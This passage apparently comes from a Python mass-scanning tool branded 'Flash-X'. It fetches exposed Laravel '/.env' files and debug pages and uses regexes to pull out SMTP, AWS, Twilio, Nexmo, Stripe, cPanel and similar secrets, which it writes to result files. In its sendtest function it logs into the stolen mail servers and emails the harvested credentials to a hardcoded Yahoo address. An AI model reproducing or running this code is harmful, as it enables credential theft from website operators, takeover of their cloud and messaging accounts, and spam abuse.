    zoho = "on"
    return zoho
  else:
    zoho = "off"
    return zoho
def sendgrid():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendgrid=on" in ip_listx:
    sendgrid = "on"
    return sendgrid
  else:
    sendgrid = "off"
    return sendgrid
def office365():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "office365=on" in ip_listx:
    office365 = "on"
    return office365
  else:
    office365 = "off"
    return office365
def mailgun():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mailgun=on" in ip_listx:
    mailgun = "on"
    return mailgun
  else:
    mailgun = "off"
    return mailgun

def phpunitshell():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "autoshell=on" in ip_listx:
    phpunitshell = "on"
    return phpunitshell
  else:
    phpunitshell = "off"
    return phpunitshell

def aws():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "aws=on" in ip_listx:
    aws = "on"
    return aws
  else:
    aws = "off"
    return aws
def twillio():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "twillio=on" in ip_listx:
    twillio = "on"
    return twillio
  else:
    twillio = "off"
    return twillio

def AWS_ACCESS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_ACCESS_KEY=on" in ip_listx:
    AWS_ACCESS_KEY = "on"
    return AWS_ACCESS_KEY
  else:
    AWS_ACCESS_KEY = "off"
    return AWS_ACCESS_KEY

def AWS_KEY():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "AWS_KEY=on" in ip_listx:
    AWS_KEY = "on"
    return AWS_KEY
  else:
    AWS_KEY = "off"
    return AWS_KEY

def NEXMO():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "NEXMO=on" in ip_listx:
    NEXMO = "on"
    return NEXMO
  else:
    NEXMO = "off"
    return NEXMO

def EXOTEL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "EXOTEL=on" in ip_listx:
    EXOTEL = "on"
    return EXOTEL
  else:
    EXOTEL = "off"
    return EXOTEL
def ONESIGNAL():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "ONESIGNAL=on" in ip_listx:
    ONESIGNAL = "on"
    return ONESIGNAL
  else:
    ONESIGNAL = "off"
    return ONESIGNAL

def TOKBOX():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "TOKBOX=on" in ip_listx:
    TOKBOX = "on"
    return TOKBOX
  else:
    TOKBOX = "off"
    return TOKBOX



def sendtest(url,host,port,user,passw,sender):
        
        if "465" in str(port):
          port = "587"
        else:
          port = str(port)

        if "unknown@unknown.com" in sender and "@" in user:
          sender_email = user
        else:
          sender_email = str(sender.replace('\"',''))

        smtp_server = str(host)
        login = str(user.replace('\"',''))
        password = str(passw.replace('\"',''))
        # specify the sender’s and receiver’s email addresses
        receive="smtp_flash_x@yahoo.com"
        receiver_email = str(fsetting)
        # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
        message = MIMEMultipart("alternative")
        message["Subject"] = "LARAVEL SMTP CRACK | HOST: "+str(host)
        if "zoho" in host:
          message["From"] = user
        else:
          message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        """
        # write the HTML part
        html = f"""\
        <html>
          <body>
              <p>-------------------</p>
              <p>URL    : {url}</p>
              <p>HOST   : {host}</p>
              <p>PORT   : {port}</p>
              <p>USER   : {user}</p>
              <p>PASSW  : {passw}</p>
              <p>SENDER : {sender}</p>
              <p>-------------------</p>
          </body>
        </html>
        """
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        try:
          s = smtplib.SMTP(smtp_server, port)
          s.connect(smtp_server,port)
          s.ehlo()
          s.starttls()
          s.ehlo()
          s.login(login, password)
          s.sendmail(sender_email, receiver_email, message.as_string())
          s.sendmail(sender_email, receive, message.as_string())
          print('[SMTP SEND INFO] Sent To '+str(fsetting))
        except (gaierror, ConnectionRefusedError):
          print('[SMTP SEND INFO] Failed to connect to the server. Bad connection settings?')
          pass
        except smtplib.SMTPServerDisconnected:
          print('[SMTP SEND INFO] Failed to connect to the server. Wrong user/password?')
          pass
        except smtplib.SMTPException as e:
          print('[SMTP SEND INFO] SMTP error occurred: ' + str(e))
          pass


def prepare(sites):

    try:
      meki = requests.get(sites+'/.env',headers=Headers,timeout=8)
      if 'DB_PASSWORD=' in meki.text:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSuccess".format(str(sites)))
        open('config-'+year+month+day+'.txt', 'a').write("\n---------------KRINSIDE env-------------\n"+sites+"\n"+meki.text + '\n-----------------------------------------\n\n')
      else:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed".format(str(sites)))
    except Exception as e:
        pass

def get_smtp(url,text):
  try:
    if "MAIL_HOST" in text:
      if "MAIL_HOST=" in text:
        mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
        try:
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
        except:
          mailport = 587
        mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
        mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
        if "MAIL_FROM" in text:
          mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
        else:
          mailfrom = "unknown@unknown.com"
          
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAIL_FROM_ADDRESS: '+str(emailform)
          remover = str(build).replace('\r', '')
          print ("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))

        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zimbra" in str(mailhost) and zimbra() == "on" :
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mZimbra\n".format(str(url)))
          save = open('result/zimbra.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser != "null" and mailpass != "null" and mailhost!="smtp.mailtrap.io" or mailuser != "" and mailpass != "" and mailhost!="smtp.mailtrap.io" or mailhost!="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSMTP Random\n".format(str(url)))
          save = open('result/SMTP_RANDOM.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "" or mailhost=="smtp.mailtrap.io":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mInvalid SMTP\n".format(str(url)))  
        try:
          sendtest(url,mailhost,mailport,mailuser,mailpass,mailfrom)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed Send\n".format(str(url)))
    else:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;31;40mFailed SMTP\n".format(str(url)))



    if "TWILIO_ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
      try:
        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
      except:
        phone = ""
      auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

      build = 'URL: '+url+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "TWILIO_SID=" in text and twillio() == "on":
      acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
      acc_key = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTWILIO_FROM=(.*?)\n', text)[0]
      except:
        acc_from = ""
    
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except: 
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))
    elif "ACCOUNT_SID=" in text and twillio() == "on":
      acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
      acc_key = reg('\nAUTH_TOKEN=(.*?)\n', text)[0]
      try:
        acc_from = reg('\nTwilio_Number=(.*?)\n', text)[0]
      except:
        acc_from = ""
      build = 'URL: '+str(url)+'\nTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(acc_key)+'\nTWILIO_FROM: '+str(acc_from)
      remover = str(build).replace('\r', '')
      save = open('result/twillio.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        twilliocheck(url,acc_sid,auhtoken,phone)
      except:
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mInvalid Twillio\n".format(url))



    if 'AWS_ACCESS_KEY_ID=' in text and AWS_ACCESS_KEY() == "on":
      mailhost = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_DEFAULT_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWS_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWS_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWS_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWS_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'AWSAPP_KEY=' in text and AWS_KEY() == "on":
      mailhost = reg("\nAWSAPP_KEY=(.*?)\n", text)[0]
      mailport = reg("\nAWSAPP_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nAWSAPP_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nAWS_ACCESS_KEY_ID: '+str(mailhost)+'\nAWS_SECRET_ACCESS_KEY: '+str(mailport)+'\nAWS_DEFAULT_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      build2 = str(mailhost)+'|'+str(mailport)+'|'+str(mailuser)
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n\n')
        save3.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif 'SES_KEY=' in text and AWS_KEY() == "on":
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY".format(str(url)))
      mailhost = reg("\nSES_KEY=(.*?)\n", text)[0]
      mailport = reg("\nSES_SECRET=(.*?)\n", text)[0]
      mailuser = reg("\nSES_REGION=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(mailhost)+'\nSES_SECRET: '+str(mailport)+'\nSES_REGION: '+str(mailuser)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mAWS_ACCESS_KEY\n".format(str(url)))
        save = open('result/'+mailuser+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,mailhost,mailport,mailuser)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))

    
    if 'MAILER_DSN=' in text:
      print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSYMFONY\n".format(str(url)))
      mailhost = reg("\nMAILER_DSN=(.*?)\n", text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(mailhost)
      remover = str(build).replace('\r', '')
      if str(mailhost) != "" and  str(mailhost) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    if "NEXMO" in text and NEXMO() == "on":
      if "NEXMO_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
      elif "NEXMO_API_KEY=" in text:
        try:
          nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
        except:
          nexmo_key = ''
        try:
          nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
        except:
          nexmo_secret = ''
        try:
          phone = reg('\nNEXMO_API_NUMBER=(.*?)\n', text)[0]
        except:
          phone = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mNEXMO\n".format(str(url)))
        build = 'URL: '+str(url)+'\nnexmo_key: '+str(nexmo_key)+'\nnexmo_secret: '+str(nexmo_secret)+'\nphone: '+str(phone)
        remover = str(build).replace('\r', '')
        save = open('result/NEXMO.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        try:
          nexmosend(url,nexmo_key,nexmo_secret)
        except:
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))


    if "EXOTEL_API_KEY" in text and EXOTEL() == "on":
      if "EXOTEL_API_KEY=" in text:
        try:
          exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
        except:
          exotel_api = ''
        try:
          exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
        except:
          exotel_token = ''
        try:
          exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
        except:
          exotel_sid = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
        remover = str(build).replace('\r', '')
        save = open('result/EXOTEL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()


    if "ONESIGNAL_APP_ID" in text and ONESIGNAL() == "on":
      if "ONESIGNAL_APP_ID=" in text:
        try:
          onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
        except:
          onesignal_id = ''
        try:
          onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
        except:
          onesignal_auth = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
        build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
        remover = str(build).replace('\r', '')
        save = open('result/ONESIGNAL.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if "TOKBOX_KEY_DEV" in text and TOKBOX() == "on":
      if "TOKBOX_KEY_DEV=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    elif "TOKBOX_KEY" in text and TOKBOX() == "on":
      if "TOKBOX_KEY=" in text:
        try:
          tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
        except:
          tokbox_key = ''
        try:
          tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
        except:
          tokbox_secret = ''
        print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
        build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
        remover = str(build).replace('\r', '')
        save = open('result/TOKBOX.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
    
    
    if "CPANEL_HOST=" in text:
      try:
        cipanel_host = reg('\nCPANEL_HOST=(.*?)\n', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('\nCPANEL_PORT=(.*?)\n', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('\nCPANEL_USERNAME=(.*?)\n', text)[0]
        cuser = reg('\nDB_USERNAME=(.*?)\n', text)[0]
        if "_" in cuser:
          cuser = cuser.split("_")[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('\nCPANEL_PASSWORD=(.*?)\n', text)[0]
        cpasswd = reg('\nDB_USERNAME=(.*?)\n', text)[0]
      except:
        cipanel_pw = ''
      if cuser != '' and cpasswd != '':
        checkcpanel(url,cuser,cpasswd)
      elif cipanel_user != '' and cipanel_pw != '':
        checkcpanel(url,cipanel_user,cipanel_pw)
        
      build = 'URL: '+str(url)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "STRIPE_KEY=" in text:
      try:
        stripe_1 = reg("\nSTRIPE_KEY=(.*?)\n", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("\nSTRIPE_SECRET=(.*?)\n", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass









def get_smtp2(url,text):
  try:
    if "<td>MAIL_HOST</td>" in text:
      if "<td>MAIL_HOST</td>" in text:
        mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailport =  587
        mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        try:
          mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        except:
          mailfrom = "unknown@unknown.com"
        build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)
        remover = str(build).replace('\r', '')
        
        if ".amazonaws.com" in text and aws() == "on":
          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
          if "MAIL_FROM" in text:
            emailform = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
          else:
            emailform = "UNKNOWN"
          getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
          build = 'URL: '+str(url)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(emailform)
          remover = str(build).replace('\r', '')
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m amazonaws\n".format(str(url)))
          save = open('result/'+getcountry+'.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
          save2 = open('result/smtp_aws_ses.txt', 'a')
          save2.write(str(remover)+'\n\n')
          save2.close()
          try:
            sendtest(url,mailhost,mailport,mailuser,mailpass,emailform)
          except:
            pass
        elif "smtp.sendgrid.net" in str(mailhost) and sendgrid() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mSendgrid\n".format(str(url)))
          save = open('result/sendgrid.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mailgun.org" in str(mailhost) and mailgun() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmailgun\n".format(str(url)))
          save = open('result/mailgun.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sparkpostmail.com" in str(mailhost) and sparkpostmail() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msparkpostmail\n".format(str(url)))
          save = open('result/sparkpostmail.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "mandrillapp.com" in str(mailhost) and mandrillapp() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mmandrillapp\n".format(str(url)))
          save = open('result/mandrill.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "zoho." in str(mailhost) and zoho() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mzoho\n".format(str(url)))
          save = open('result/zoho.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "smtp-relay.gmail" in str(mailhost) and relay() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40mrelay\n".format(str(url)))
          save = open('result/smtp-relay.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "sendinblue.com" in str(mailhost) and sendinblue() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/sendinblue.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "kasserver.com" in str(mailhost):
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40msendinblue\n".format(str(url)))
          save = open('result/kasserver.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif "1and1." in str(mailhost) and and1() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40m1and1\n".format(str(url)))
          save = open('result/1and1.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
        elif mailhost == "smtp.office365.com" and office365() == "on":
          print("\033[1;40m[BY Flash-X] {} |   \033[1;32;40moffice365\n".format(str(url)))
          save = open('result/office365.txt', 'a')
          save.write(str(remover)+'\n\n')
          save.close()
